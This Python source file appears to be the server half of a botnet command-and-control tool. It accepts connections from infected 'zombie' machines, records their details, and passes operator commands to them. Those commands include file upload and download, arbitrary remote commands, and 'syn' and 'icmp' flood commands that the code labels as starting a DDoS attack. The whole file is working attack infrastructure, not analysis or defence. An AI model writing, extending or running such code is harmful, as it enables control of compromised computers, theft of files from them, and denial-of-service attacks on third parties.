import socket
import threading
import uuid
import json
import queue
import os
from dotenv import load_dotenv
from C2Server import OUTPUT_DIR, DOWNLOAD_DIR

ip_address = os.environ.get("SERVERIP")
port_number = int(os.environ.get("SERVERPORT"))

THREADS = {}
IPS = {}
CMD_INPUT = {}
CMD_OUTPUT = {}
ZOMBIES = {}
OUTPUT = {}

data_lock = threading.Lock()

def init_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((ip_address, port_number))
    print(f"Server started on {ip_address}:{port_number}...")
    server_socket.listen(10)
    while True:
        try : 
            client_socket, client_address = server_socket.accept()
            print(f"Accepted connection from {client_address}...")
            thread_uuid = uuid.uuid4().hex
            t = threading.Thread(target=handle_connection, args=(client_socket, 
                                                                 client_address, 
                                                                 thread_uuid), name=f"Thread-{thread_uuid}")
            client_socket.send("ready".encode())
            with data_lock:
                THREADS[thread_uuid] = t
                IPS[thread_uuid] = client_address
                CMD_INPUT[thread_uuid] = queue.Queue()
                CMD_OUTPUT[thread_uuid] = queue.Queue()
                zombie_details = json.loads(client_socket.recv(1024).decode())
                ZOMBIES[thread_uuid] = zombie_details
                OUTPUT[thread_uuid] = ""
            t.start()
        except KeyboardInterrupt as e:
            print("Closing all connections...")
            for thread in THREADS.values():
                thread.join()
            close_connection(server_socket)
            break
        
def handle_connection(client_socket, client_address, thread_uuid):
    while True:
        command = CMD_INPUT[thread_uuid].get()
        response = ""
        if command == 'quit':
            client_socket.send(command.encode())
            response = "Connection closed by server"
            break

        elif command.split(" ")[0] == "upload":
            # upload <filename> <filesize>
            filename = os.path.basename(command.split(" ")[1])
            file_size = os.path.getsize(command.split(" ")[1])
            command += " " + str(file_size)

            # Send command to client
            client_socket.send(command.encode())
            # Wait for client to be ready
            client_ready = client_socket.recv(1024 * 10000).decode()
            # Send file to client
            if client_ready == "ready":
                with open(command.split(" ")[1], "rb") as f:
                    client_socket.send(f.read())
            # File upload successful
            response = client_socket.recv(1024).decode()

        elif command.split(" ")[0] == "download":
            # download <filename>
            filename = os.path.basename(command.split(" ")[1])
            # Send command to client
            client_socket.send(command.encode())
            # Getting file
            response = client_socket.recv(2048)
            # Saving file
            with open(f"{DOWNLOAD_DIR}/{filename}", "wb") as f:
                f.write(response)
            response = f"Downloaded {filename} to downloads/{filename}"

        elif command.split(" ")[0] == "syn" or command.split(" ")[0] == "icmp":
            client_socket.send(command.encode())
            response = "DDoS attack started"
        else:
            client_socket.send(command.encode())
            response = client_socket.recv(1024).decode()
        print(response)
        CMD_OUTPUT[thread_uuid].put(response)

    print(f"Closing connection with {client_address}...")
    close_connection(client_socket)
    remove_thread(thread_uuid)

def close_connection(connection):
    connection.close()

def getThreadNameAndIP():
    with data_lock:
        thread_info_list  = []
        for threadUUID in THREADS:
            if os.path.exists(f"{OUTPUT_DIR}/{threadUUID}.txt"):
                with open(f"{OUTPUT_DIR}/{threadUUID}.txt", "r") as f:
                    output = f.read()
            else:
                output = ""
            thread_info_list.append({
                "thread_uuid" : threadUUID,
                "details" : ZOMBIES[threadUUID],
                "last_output" : output
                })
        return thread_info_list

def getSpecificThread(thread_uuid):
    with data_lock:
        return {
            "thread_uuid" : thread_uuid,
            "details" : ZOMBIES[thread_uuid]
            }

def remove_thread(thread_uuid):
    with data_lock:
        del THREADS[thread_uuid]
        del IPS[thread_uuid]
        del CMD_INPUT[thread_uuid]
        del CMD_OUTPUT[thread_uuid]
        del ZOMBIES[thread_uuid]

if __name__ == "__main__":
    init_server()